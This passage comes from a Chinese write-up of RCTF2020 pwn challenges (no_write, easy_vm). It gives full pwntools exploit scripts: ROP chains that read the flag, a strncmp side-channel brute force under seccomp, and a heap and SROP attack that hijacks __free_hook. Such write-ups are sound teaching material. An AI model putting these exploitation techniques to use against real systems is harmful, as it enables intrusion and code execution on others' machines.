        raw_input()
        p.send("x68")
        p.recvuntil("done! your code: ")
        libc_base = u64(p.recvline().strip('n').ljust(8,'x00')) - 231 - libc.sym['__libc_start_main']
        log.success("libc base => " + hex(libc_base))
        #make rops
        p_rdi = libc_base + 0x000000000002155f
        p_rsi = libc_base + 0x0000000000023e6a
        p_rdx = libc_base + 0x0000000000001b96
        p_rax = libc_base + 0x00000000000439c8
        syscall = libc_base + 0x00000000000d2975
        flag_addr = libc_base + libc.sym['__malloc_hook'] + 0x200
        rops = flat([
                #read flag into libc
                p_rdi,0,
                p_rsi,flag_addr,
                p_rdx,0x8,
                p_rax,0,
                syscall,
                #open
                p_rdi,flag_addr,
                p_rsi,0,
                p_rdx,0,
                p_rax,2,
                syscall,
                #read
                p_rdi,3,
                p_rsi,flag_addr+0x20,
                p_rdx,0x20,
                p_rax,0,
                syscall,
                #write
                p_rdi,1,
                p_rsi,flag_addr+0x20,
                p_rdx,0x20,
                p_rax,1,
                syscall
            ])
        p.recvuntil("want to continue?")
        payload = 'y'+rops
        payload += '+[>+],.'
        p.sendline(payload)
        raw_input()
        p.send("x30")
        p.recvuntil("want to continue?")
        p.send("n./flag")
        p.interactive()
    exp()
## no_write
###  程序逻辑
类似于`pwnable.tw`的一道`de-aslr`，不过这题开了seccomp限制只能`open/read`，需要进行侧信道攻击。
程序很简单，一个栈溢出。
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      char v4; // [rsp+0h] [rbp-10h]
      init();
      read_n(&v4, 0x100);
      return 0;
    }
###  漏洞利用
原型题的`de-aslr`预期解其实和本题并不相同，在提交的`writeup`中有一种很巧妙的方法，是通过一个汇编截断，得到一个有趣的gadget，在我们可控rbp和rbx的时候可以通过此方法实现任意地址的增加。
    gdb-peda$ x/8i 0x4005e8
       0x4005e8 : add    DWORD PTR [rbp-0x3d],ebx
       0x4005eb : nop    DWORD PTR [rax+rax*1+0x0]
       0x4005f0 : repz ret
在原题中，是通过栈迁移到bss处然后调用`gets`在bss上留下libc地址再通过增加偏移得到任意Libc地址。这里我们没有gets，使用`__libc_start_main`调用`readn`也可以在bss上留下libc地址，我们通过此方法得到`__strncmp_sse42`函数地址，这里很神奇的是我们使用`strncmp`侧信道比较返回值并非字符差值，而是这个函数地址，只有直接调用它才能进行侧信道比较，这里我写了个测试demo进行测试，发现原来`strncmp`经过延迟绑定后放入got表的并非`strncmp`地址，而是`__strncmp_sse42`的地址，这一点也直接导致我们比赛时功亏一篑。
在可以进行任意libc获得之后我们使用这种方式获得`open`地址，打开flag，读到bss上，再使用add的gadget得到`__strncmp_sse42`进行单字节比较，比较之后使用`add`得到`syscall`地址，当字符命中时`eax=0`，故调用`read`等待用户输入，否则会调用一个非法系统调用`EOFError`，通过这种方式即可判断出是否得到了正确字符。
    //gcc ./test.c -g -O0 -o test
    #include 
    #include 
    #include 
    int main()
    {
        char* s = "123";
        char buf[0x100];
        gets(buf);
        if(!strncmp(s,buf,strlen(s)))
            puts("test demo");
        return 0;
    }
    gdb-peda$ got
    /home/wz/Desktop/CTF/RCTF2020/no_write/test:     file format elf64-x86-64
    DYNAMIC RELOCATION RECORDS
    OFFSET           TYPE              VALUE 
    0000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__
    0000000000601018 R_X86_64_JUMP_SLOT  strncmp@GLIBC_2.2.5
    0000000000601020 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
    0000000000601028 R_X86_64_JUMP_SLOT  strlen@GLIBC_2.2.5
    0000000000601030 R_X86_64_JUMP_SLOT  __stack_chk_fail@GLIBC_2.4
    0000000000601038 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5
    0000000000601040 R_X86_64_JUMP_SLOT  gets@GLIBC_2.2.5
    gdb-peda$ x/8gx 0x0000000000601018
    0x601018:       0x00007ffff7b52a90      0x0000000000400516
    0x601028:       0x00007ffff7a98720      0x0000000000400536
    0x601038:       0x00007ffff7a2d740      0x00007ffff7a7bd80
    0x601048:       0x0000000000000000      0x0000000000000000
    gdb-peda$ x/8gx 0x00007ffff7b52a90
    0x7ffff7b52a90 :       0x000fbb840fd28548      0xbd840f01fa834800
    0x7ffff7b52aa0 :    0xf189d3894900000f      0x83483fe18348f889
    0x7ffff7b52ab0 :    0x83497730f9833fe0      0x0f6f0ff3447730f8
    0x7ffff7b52ac0 :    0xc0ef0f66166f0ff3      0xca740f66c1740f66
    gdb-peda$ p & strcmp
    $3 = ( *) 0x7ffff7a96cd0 
    gdb-peda$ p & strncmp
    $4 = ( *) 0x7ffff7a98b20 
    gdb-peda$
###  exp.py
在2.23环境下写完才发现是2.27的Libc，这题跟libc关系不大，这里的exp只改一下地址偏移即可适用于2.27
    #coding=utf-8
    from pwn import *
    import string
    r = lambda p:p.recv()
    rl = lambda p:p.recvline()
    ru = lambda p,x:p.recvuntil(x)
    rn = lambda p,x:p.recvn(x)
    rud = lambda p,x:p.recvuntil(x,drop=True)
    s = lambda p,x:p.send(x)
    sl = lambda p,x:p.sendline(x)
    sla = lambda p,x,y:p.sendlineafter(x,y)
    sa = lambda p,x,y:p.sendafter(x,y)
    context.update(arch='amd64',os='linux',log_level='info')
    context.terminal = ['tmux','split','-h']
    debug = 1
    elf = ELF('./no_write')
    libc_offset = 0x3c4b20
    gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
    chr_set = "{}_"+string.ascii_letters+string.digits
    if debug:
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        p = process('./no_write')
    else:
        libc = ELF('./x64_libc.so.6')
        p = remote('f.buuoj.cn',20173)
    csu_end_addr = 0x40076a
    csu_front_addr = 0x400750
    main_addr = 0x4006e8
    ret_addr = 0x00000000004004be
    leave = 0x000000000040067c
    #add    DWORD PTR [rbp-0x3d],ebx;nop    DWORD PTR [rax+rax*1+0x0];repz ret
    add = 0x4005e8
    libc_start_main = 0x400544
    p_rdi = 0x0000000000400773
    p_rbp = 0x0000000000400588
    p_rsp_r3 = 0x000000000040076d
    p_rbp_r4 = 0x000000000040076b
    readn = 0x4006bf
    p_rbx_rbp_p_4 = csu_end_addr
    p_rsi_r15 = 0x0000000000400771
    def csu(rbx, rbp, r12, r13, r14, r15, fake_rbp, last):
        # pop rbx,rbp,r12,r13,r14,r15
        # rbx should be 0,
        # rbp should be 1,enable not to jump
        # r12 should be the function we want to call
        # rdi=edi=r13d
        # rsi=r14
        # rdx=r15
        payload = ''
        payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
        payload += p64(csu_front_addr)
        payload += 'a' * 0x10
        payload += p64(fake_rbp)
        payload += 'a' * 0x20
        payload += p64(last)
        return payload
    def exp(real_flag):
        #leak libc
        read_plt = elf.plt['read']
        read_got = elf.got['read']
        bss = elf.bss()+0x300
        payload = 'a'*0x18
        payload += csu(0,1,read_got,0,bss-(0x378-0x2d0),0x300,bss,leave)
        sleep(0.1)
        p.send(payload)
        payload = p64(bss)
        payload += p64(0)*4
        payload += p64(leave)
        payload = payload.ljust((0x378-0x2d0),'x00')
        payload += p64(bss+0x300)
        payload += p64(p_rdi)+p64(readn)+p64(libc_start_main)
        #payload += csu(0,1,read_got,0,bss+0x300,0x100,bss+0x300,main_addr)
        sleep(0.1)
        #raw_input()
        p.send(payload)
        #leave sth on bss
        #get read
        off_open_target = -0x230
        payload = p64(p_rbx_rbp_p_4)+p64(off_open_target,sign="signed")+p64(0x6012c8+0x3d)+p64(0)*4+p64(add)
        open_addr = 0x6012c8
        flag_addr = bss+0x300
        payload += csu(0,1,read_got,0,bss+0x300,0x300,bss+0x300,leave)
        sleep(0.1)
        #raw_input()
        p.send(payload)
        #open
        payload = "./flagx00x00"+csu(0,1,open_addr,flag_addr,0,0,bss+0x300,ret_addr)
        #read
        payload += csu(0,1,read_got,3,bss+0x700,0x20,bss+0x300,ret_addr)
        payload += csu(0,1,read_got,0,bss+0x500,0x200,bss+0x500,leave)
        sleep(0.1)
        #raw_input()
        p.send(payload)
        #gdb.attach(p,'b* 0x400759')
        off_strncmp_open = 0x7ffff7b52a90 - 0x7ffff7b04030
        off_syscall_strncmp = -0x8971b
        #make strncmp
        payload = p64(bss+0x300)+p64(p_rbx_rbp_p_4)+p64(off_strncmp_open,sign="signed")+p64(open_addr+0x3d)+p64(0)*4+p64(add)
        #strncmp
        res = bss+0x700
        payload += csu(0,1,read_got,0,res+0x100,0x20,bss+0x500,ret_addr)
        payload += csu(0,1,open_addr,res,res+0x100,len(real_flag),bss+0x500,ret_addr)
        #recover syscall
        payload += p64(p_rbx_rbp_p_4)+p64(off_syscall_strncmp,sign="signed")+p64(open_addr+0x3d)+p64(0)*4+p64(add)
        payload += p64(p_rdi)+p64(0)+p64(p_rsi_r15)+p64(bss+0x200)*2+p64(p_rbp)+p64(open_addr-8)+p64(leave)
        sleep(0.1)
        #raw_input()
        p.send(payload)
        sleep(0.1)
        #raw_input()
        p.send(real_flag)
    my_flag = ""
    i = 0
    while True:
        try:
            exp(my_flag+chr_set[i])
            p.recvline(timeout=0.2)
            #p.interactive()
            my_flag = my_flag + chr_set[i]
            print my_flag
            i = 0
            p.close()
        except EOFError:
            i += 1
            p.close()
        if debug:
            libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
            p = process('./no_write')
        else:
            libc = ELF('./x64_libc.so.6')
            p = remote('f.buuoj.cn',20173)
## easy_vm
###  程序逻辑 && 漏洞分析
是一道典型的VM题目，子进程关闭了`0/1/2`，另外seccomp限制了不能输出，但是这里的seccomp只是针对子进程，父进程会输出子进程的结束码，我们可以借此进行数据泄露。
我们输入的操作码会在实际run之前进行合法性检查，这点很像`bpf`的模式，注意检查里当发现输入是`0xff`时会直接退出，不检查后面的输入，每当检查出一组操作，就会让操作码数量`count++`。这里的count也是后面run的轮次。
实现的VM操作指令有很多，像`mov/xor/|/add/sub/divide/mul`等，因为太多就不一一举例了，这里的问题在于`choice=12`没有进行检查，可以让我们将操作码取址的位置向后偏移至多`0xff`(当然也可以多搞几组可以增加偏移)，假设我们给一组`payload
= 0xn + 12 + valid_code + 0xff +
invalid_code`，则可以在`check`阶段得到合法指令的`count`，0xff后的指令没有检查，故可以用执行非法指令count组。这样基本所有指令都可以越界了。
    else if ( choice < 13 )                 // choice==12
        {
          chunk_addr += (unsigned __int8)ReturnValOfArg(chunk_addr + 1) + 2;
        }
我们先使用越界写指令将`data_chunk`的size部分改小，free之后让它进入`unsorted
bin`，再分配可以让堆上留libc地址，再通过偏移减去得到libc基址，放入堆上的模拟寄存器中，即可在没有泄露libc地址的情况下实现任意libc地址写，同样的，因为我们的`node_addr`里有堆地址，也可以实现任意堆地址写。这里我们使用mov指令改`__free_hook`为`setcontext+53`，在堆上布置`srop`的`frame`，从而进行栈迁移，到堆上执行rop，rop的内容为读取flag，并单字节作为`exit`的状态码返回，从而在父进程单字节得到flag。
###  exp.py
每条指令都加了注释，方便理解(vm指令太多懒得一条条写了)
    #coding=utf-8
    from pwn import *
    r = lambda p:p.recv()
    rl = lambda p:p.recvline()
    ru = lambda p,x:p.recvuntil(x)
    rn = lambda p,x:p.recvn(x)
    rud = lambda p,x:p.recvuntil(x,drop=True)
    s = lambda p,x:p.send(x)
    sl = lambda p,x:p.sendline(x)
    sla = lambda p,x,y:p.sendlineafter(x,y)
    sa = lambda p,x,y:p.sendafter(x,y)
    context.update(arch='amd64',os='linux',log_level='info')
    context.terminal = ['tmux','split','-h']
    debug = 1
    elf = ELF('./vm')
    libc_offset = 0x3c4b20
    gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]